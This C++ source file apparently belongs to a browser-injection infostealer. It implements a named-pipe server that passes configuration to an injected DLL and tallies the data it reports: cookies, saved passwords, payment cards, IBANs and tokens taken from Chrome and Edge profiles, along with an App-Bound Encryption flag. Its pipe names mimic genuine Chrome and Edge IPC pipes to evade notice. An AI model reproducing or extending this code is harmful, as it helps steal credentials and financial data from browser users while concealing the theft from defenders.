#include "pipe_server.hpp"
#include "../core/console_silent.hpp"
#include <iostream>
#include <vector>
#include <algorithm>
#include <sstream>
#include <regex>
namespace Injector {
    PipeServer::PipeServer(const std::wstring& browserType)
        : m_pipeName(GenerateName(browserType)), m_browserType(browserType) {}
    void PipeServer::Create() {
        m_hPipe.reset(CreateNamedPipeW(m_pipeName.c_str(), PIPE_ACCESS_DUPLEX,
                                       PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
                                       1, 4096, 4096, 0, nullptr));
        if (!m_hPipe) {
            throw std::runtime_error("CreateNamedPipeW failed: " + std::to_string(GetLastError()));
        }
    }
    void PipeServer::WaitForClient() {
        if (!ConnectNamedPipe(m_hPipe.get(), nullptr) && GetLastError() != ERROR_PIPE_CONNECTED) {
            throw std::runtime_error("ConnectNamedPipe failed: " + std::to_string(GetLastError()));
        }
    }
    void PipeServer::SendConfig(const std::filesystem::path& output) {
        Write(output.string());
        Sleep(10);
        Write(Core::ToUtf8(m_browserType));
        Sleep(10);
    }
    void PipeServer::Write(const std::string& msg) {
        DWORD written = 0;
        if (!WriteFile(m_hPipe.get(), msg.c_str(), static_cast<DWORD>(msg.length() + 1), &written, nullptr)) {
            throw std::runtime_error("WriteFile failed");
        }
    }
    void PipeServer::ProcessMessages() {
        const std::string completionSignal = "__DLL_PIPE_COMPLETION_SIGNAL__";
        std::string accumulated;
        char buffer[4096];
        bool completed = false;
        DWORD startTime = GetTickCount();
        while (!completed && (GetTickCount() - startTime < Core::TIMEOUT_MS)) {
            DWORD available = 0;
            if (!PeekNamedPipe(m_hPipe.get(), nullptr, 0, nullptr, &available, nullptr)) {
                if (GetLastError() == ERROR_BROKEN_PIPE) break;
                break;
            }
            if (available == 0) {
                Sleep(100);
                continue;
            }
            DWORD read = 0;
            if (!ReadFile(m_hPipe.get(), buffer, sizeof(buffer) - 1, &read, nullptr) || read == 0) {
                if (GetLastError() == ERROR_BROKEN_PIPE) break;
                continue;
            }
            accumulated.append(buffer, read);
            size_t start = 0;
            size_t nullPos;
            while ((nullPos = accumulated.find('\0', start)) != std::string::npos) {
                std::string msg = accumulated.substr(start, nullPos - start);
                start = nullPos + 1;
                if (msg == completionSignal) {
                    completed = true;
                    break;
                }
                if (msg.rfind("PROFILE:", 0) == 0) {
                    m_stats.profiles++;
                }
                else if (msg.rfind("NO_ABE:", 0) == 0) {
                    m_stats.noAbe = true;
                }
                else if (msg.rfind("COOKIES:", 0) == 0) {
                    size_t sep = msg.find(':', 8);
                    if (sep != std::string::npos) {
                        int count = std::stoi(msg.substr(8, sep - 8));
                        int total = std::stoi(msg.substr(sep + 1));
                        m_stats.cookies += count;
                        m_stats.cookiesTotal += total;
                    }
                }
                else if (msg.rfind("PASSWORDS:", 0) == 0) {
                    int count = std::stoi(msg.substr(10));
                    m_stats.passwords += count;
                }
                else if (msg.rfind("CARDS:", 0) == 0) {
                    int count = std::stoi(msg.substr(6));
                    m_stats.cards += count;
                }
                else if (msg.rfind("IBANS:", 0) == 0) {
                    int count = std::stoi(msg.substr(6));
                    m_stats.ibans += count;
                }
                else if (msg.rfind("TOKENS:", 0) == 0) {
                    int count = std::stoi(msg.substr(7));
                    m_stats.tokens += count;
                }
            }
            accumulated.erase(0, start);
        }
    }
    std::wstring PipeServer::GenerateName(const std::wstring& browserType) {
        DWORD pid = GetCurrentProcessId();
        DWORD tid = GetCurrentThreadId();
        DWORD tick = GetTickCount();
        DWORD id1 = (pid ^ tick) & 0xFFFF;
        DWORD id2 = (tid ^ (tick >> 16)) & 0xFFFF;
        DWORD id3 = ((pid << 8) ^ tid) & 0xFFFF;
        std::wstring pipeName = L"\\\\.\\pipe\\";
        std::wstring lower = browserType;
        std::transform(lower.begin(), lower.end(), lower.begin(), ::towlower);
        wchar_t buffer[128];
        if (lower == L"chrome" || lower == L"chrome-beta") {
            static const wchar_t* patterns[] = {
                L"chrome.sync.%u.%u.%04X",
                L"chrome.nacl.%u_%04X",
                L"mojo.%u.%u.%04X.chrome"
            };
            swprintf_s(buffer, patterns[(id1 + id2) % 3], id1, id2, id3);
        } else if (lower == L"edge") {
            static const wchar_t* patterns[] = {
                L"msedge.sync.%u.%u",
                L"msedge.crashpad_%u_%04X",
                L"LOCAL\\msedge_%u"
            };
            swprintf_s(buffer, patterns[(id2 + id3) % 3], id1, id2);
        } else {
            swprintf_s(buffer, L"chromium.ipc.%u.%u", id1, id2);
        }
        pipeName += buffer;
        return pipeName;
    }
}